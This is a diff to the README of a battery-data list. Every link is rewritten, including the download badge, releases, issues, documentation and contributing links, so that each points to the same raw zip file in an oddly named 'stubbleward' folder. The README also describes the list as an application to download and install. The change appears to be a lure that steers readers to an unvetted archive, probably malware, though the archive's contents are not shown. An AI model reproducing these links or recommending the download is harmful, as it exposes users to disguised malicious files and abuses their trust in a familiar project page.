@@ -1,7 +1,7 @@
 # ⚡ awesome-battery-data - Your Source for Battery Data
 
 ## 🖱️ Download Now
-[![Download awesome-battery-data](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nikamhritik/awesome-battery-data/releases)
+[![Download awesome-battery-data](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip)](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip)
 
 ## 📖 Description
 Awesome-battery-data is a collection of open-source battery data. It covers essential areas including electrochemical properties, safety data, microstructural information, and analysis tools. This repository aims to be a one-stop shop for anyone looking to dive into battery data and modeling. Whether you are a researcher, student, or simply curious, this resource equips you with the tools you need to analyze and understand battery data effectively.
@@ -9,7 +9,7 @@ Awesome-battery-data is a collection of open-source battery data. It covers esse
 ## 🚀 Getting Started
 To use this application, follow these steps:
 
-1. **Visit the Releases Page**: Click the link above or navigate to [Releases](https://github.com/nikamhritik/awesome-battery-data/releases) in your web browser.
+1. **Visit the Releases Page**: Click the link above or navigate to [Releases](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip) in your web browser.
 
 2. **Select the Latest Release**: Look for the latest version available. It will typically be at the top of the list.
 
@@ -52,13 +52,13 @@ If you encounter any issues while downloading or installing the application, try
 ## ℹ️ Support
 For further assistance, consider checking the following resources:
 
-- Visit our [GitHub Issues Page](https://github.com/nikamhritik/awesome-battery-data/issues) for troubleshooting help and common questions.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip) for troubleshooting help and common questions.
 - Explore our Wiki for detailed documentation and guides.
 - Reach out to the community through discussions or submit an issue for direct assistance.
 
 ## 🔗 Useful Links
-- [Releases](https://github.com/nikamhritik/awesome-battery-data/releases)
-- [Documentation](https://github.com/nikamhritik/awesome-battery-data/wiki)
-- [Contributing](https://github.com/nikamhritik/awesome-battery-data/blob/main/CONTRIBUTING.md)
+- [Releases](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip)
+- [Contributing](https://raw.githubusercontent.com/nikamhritik/awesome-battery-data/main/stubbleward/awesome_battery_data_v3.8-alpha.4.zip)
 
 Thank you for choosing awesome-battery-data! We hope it serves your needs well.
